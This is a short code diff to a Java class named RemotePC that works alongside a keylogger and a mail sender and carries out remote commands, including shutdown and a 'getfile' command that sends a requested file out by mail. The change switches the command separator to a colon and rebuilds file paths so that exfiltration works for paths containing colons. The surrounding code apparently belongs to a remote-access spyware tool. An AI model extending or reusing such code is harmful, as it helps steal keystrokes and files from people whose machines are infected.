@@ -92,7 +92,7 @@ public class RemotePC {
   SendMail send;
 
   public RemotePC(String message, KeyLog keylog, SendMail send) {
-    this.message = message.split("_");
+    this.message = message.split(":");
     this.keylog = keylog;
     this.send = send;
   }
@@ -171,7 +171,12 @@ public class RemotePC {
         System.out.println("shutdown suscessfull");
         break;
       case "getfile":
-        send.sendFile(message[1]);
+        String path = "";
+        for (int i = 1; i < message.length; i++) {
+          path += message[i];
+          if (i != message.length-1) path += ':';
+        }
+        send.sendFile(path);
         System.out.println("get file suscessfull");
         break;
       default:
